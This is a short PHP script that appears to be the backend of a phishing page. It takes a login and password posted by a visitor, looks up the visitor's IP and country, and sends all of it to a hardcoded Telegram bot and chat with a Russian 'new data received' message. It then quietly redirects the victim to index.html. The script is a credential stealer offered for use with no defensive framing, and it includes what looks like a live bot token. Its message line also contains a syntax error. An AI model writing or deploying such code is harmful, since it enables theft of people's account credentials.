<?php


$token = "7614208266:AAH3ZREmu_YeBIt4I0iHkfnakA5EayRTt8k";


$chat_id = "-1002309746547";


$login = ($_POST['login']);
$password =($_POST['password']);




$ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] :
($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

$country = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));

$message = "Полученны новые данные: \n Логин: " . $login . "\n Пароль: " . $password . "\n\n IP: " . $ip . "/n Страна:  " $country->country; "";



file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.urlencode($message).'&parse_mode=html');

header('Location: index.html');
?>